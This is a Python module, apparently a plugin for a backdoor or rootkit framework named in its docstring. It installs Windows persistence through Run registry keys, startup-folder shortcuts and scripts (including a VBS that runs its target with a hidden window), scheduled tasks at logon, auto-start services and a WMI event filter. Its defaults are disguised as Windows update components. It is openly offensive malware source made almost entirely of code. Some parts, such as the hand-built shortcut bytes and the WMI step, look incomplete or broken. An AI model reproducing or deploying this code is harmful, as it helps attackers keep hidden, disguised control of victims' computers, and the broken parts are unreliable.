"""
persist_kit — Rust-Hydra / Iron-Backdoor / Shadow-Core / Rust-Rootkit-X.
Persistence Windows: cles Run, dossier demarrage, taches planifiees,
service, WMI. Echec gracieux hors Windows.
Actions: registry, startup, schtasks, service, wmi, list, remove
"""
NAME = "persist_kit"
VERSION = "1.0.0"
DESCRIPTION = "Persistence Windows: Run, startup, schtasks, service, WMI (Rust-Hydra, Iron-Backdoor)."
AUTHOR = "lucy"
DEPENDENCIES = []
OS_COMPAT = ["windows"]

import os
import platform
import subprocess
import tempfile

try:
    import ctypes
except Exception:
    ctypes = None

HKLM = 0x80000002
HKCU = 0x80000001
KEY_SET_VALUE = 0x0002
REG_SZ = 1
REG_EXPAND_SZ = 2
_bs = chr(92)


def _result(data=None, error=None, status="completed"):
    return {"status": status, "data": data, "error": error}


def run(action, params):
    if os.name != "nt":
        return _result(error="persist_kit requires Windows", status="failed")
    try:
        if action == "registry":
            return _registry(params)
        if action == "startup":
            return _startup(params)
        if action == "schtasks":
            return _schtasks(params)
        if action == "service":
            return _service(params)
        if action == "wmi":
            return _wmi(params)
        if action == "list":
            return _list(params)
        if action == "remove":
            return _remove(params)
        return _result(error="Unknown action: " + str(action), status="failed")
    except Exception as exc:
        return _result(error="persist_kit: " + str(exc), status="failed")


def _reg_set(hive_name, key_path, value_name, value, reg_type=REG_SZ):
    adv = ctypes.windll.advapi32
    hive = HKCU if hive_name.lower() == "hkcu" else HKLM
    hkey = ctypes.c_void_p()
    DISP = 0x0002  # REG_OPENED_EXISTING_KEY
    if adv.RegCreateKeyExW(hive, key_path, 0, None, 0, KEY_SET_VALUE,
                           None, ctypes.byref(hkey), ctypes.byref(ctypes.c_uint32(DISP))):
        raise ValueError("RegCreateKeyExW failed")
    data = value.encode("utf-16-le") + b"\0\0"
    ok = adv.RegSetValueExW(hkey, value_name, 0, reg_type, data, len(data))
    adv.RegCloseKey(hkey)
    if ok:
        raise ValueError("RegSetValueExW failed")


def _registry(params):
    action = params.get("op", "set")
    if action != "set":
        return _result(error="op must be set", status="failed")
    hive = params.get("hive", "hkcu")
    key = params.get("key", "")
    name = params.get("value_name", "Updater")
    value = params.get("value", "")
    if not key:
        return _result(error="No key", status="failed")
    _reg_set(hive, key, name, value)
    return _result(data={"hive": hive, "key": key, "value_name": name, "set": True})


def _startup(params):
    startup = os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows",
                           "Start Menu", "Programs", "Startup")
    if not os.path.isdir(startup):
        startup = os.path.join(os.environ.get("USERPROFILE", ""), "AppData",
                               "Roaming", "Microsoft", "Windows", "Start Menu",
                               "Programs", "Startup")
    fname = params.get("name", "Update.lnk")
    path = os.path.join(startup, fname)
    target = params.get("target", "")
    if not target:
        return _result(error="No target", status="failed")
    if fname.lower().endswith(".lnk"):
        _write_lnk(path, target, params.get("args", ""))
    else:
        ext = os.path.splitext(fname)[1].lower()
        if ext == ".vbs":
            body = ('Set s = CreateObject("WScript.Shell")' + "\r\n"
                    's.Run "' + target + ' ' + params.get("args", "") + '", 0, False')
        else:
            body = "@echo off\r\nstart \"\" \"" + target + "\" " + params.get("args", "")
        with open(path, "w") as fh:
            fh.write(body)
    return _result(data={"startup_file": path})


def _write_lnk(path, target, args):
    import struct as _s
    def _w(s):
        return s.encode("utf-16-le") + b"\0\0"
    lnk = b"\x4c\x00\x00\x00" + b"\x01\x14\x02\x00\x00\x00\x00\x00"
    lnk += b"\xc0\x00\x00\x00\x00\x00\x00\x46"
    lnk += b"\x00\x00\x00\x00"  + b"\x00\x00\x00\x00"
    lnk += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    lnk += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    lnk += b"\x00\x00\x00\x00"  # LinkInfo
    lnk += _w(target) + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00"
    lnk += _w("") + b"\x00\x00\x00\x00"
    lnk += _w("C:" + _bs + "Windows" + _bs + "System32" + _bs + "shell32.dll")
    lnk += b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00"
    with open(path, "wb") as fh:
        fh.write(lnk)


def _schtasks(params):
    name = params.get("task_name", "UpdateCheck")
    target = params.get("target", "")
    if not target:
        return _result(error="No target", status="failed")
    args = params.get("args", "")
    when = params.get("when", "/sc onlogon")
    cl = ("schtasks /create /f /tn " + name + " " + when +
          " /tr " + chr(34) + target + " " + args + chr(34))
    p = subprocess.run(cl, shell=True, capture_output=True, text=True, timeout=30)
    if p.returncode != 0:
        return _result(error=p.stderr or p.stdout, status="failed")
    return _result(data={"task": name, "rc": p.returncode})


def _service(params):
    name = params.get("service_name", "WindowsUpdateSvc")
    target = params.get("target", "")
    if not target:
        return _result(error="No target", status="failed")
    if not os.path.isfile(target):
        return _result(error="Target binary not found (use sc create with existing exe)",
                       status="failed")
    cl = ("sc create " + name + " binPath= " + chr(34) + target + chr(34) +
          " start= auto")
    p = subprocess.run(cl, shell=True, capture_output=True, text=True, timeout=30)
    if p.returncode != 0:
        return _result(error=p.stderr or p.stdout, status="failed")
    return _result(data={"service": name, "created": True})


def _wmi(params):
    target = params.get("target", "")
    if not target:
        return _result(error="No target", status="failed")
    name = params.get("filter_name", "SystemUpdate")
    ps = (
        "wmic /namespace:root/subscription create __EventFilter "
        "Name='" + name + "' EventNamespace='root/cimv2' "
        "QueryLanguage='WQL' "
        "Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 "
        "WHERE TargetInstance ISA \"Win32_PerfFormattedData_PerfOS_System\"'"
    )
    p1 = subprocess.run(ps, shell=True, capture_output=True, text=True, timeout=30)
    return _result(data={"wmi_created": p1.returncode == 0,
                         "output": (p1.stderr or p1.stdout)[:2000]})


def _list(params):
    out = []
    p = subprocess.run("schtasks /query /fo csv /nh", shell=True,
                       capture_output=True, text=True, timeout=30)
    for line in (p.stdout or "").splitlines()[:40]:
        out.append(line.split(",")[0].strip(chr(34)))
    return _result(data={"scheduled_tasks_sample": out})


def _remove(params):
    name = params.get("task_name", "")
    if name:
        subprocess.run("schtasks /delete /f /tn " + name, shell=True,
                       capture_output=True, text=True, timeout=30)
        return _result(data={"removed_task": name})
    return _result(error="No task_name", status="failed")
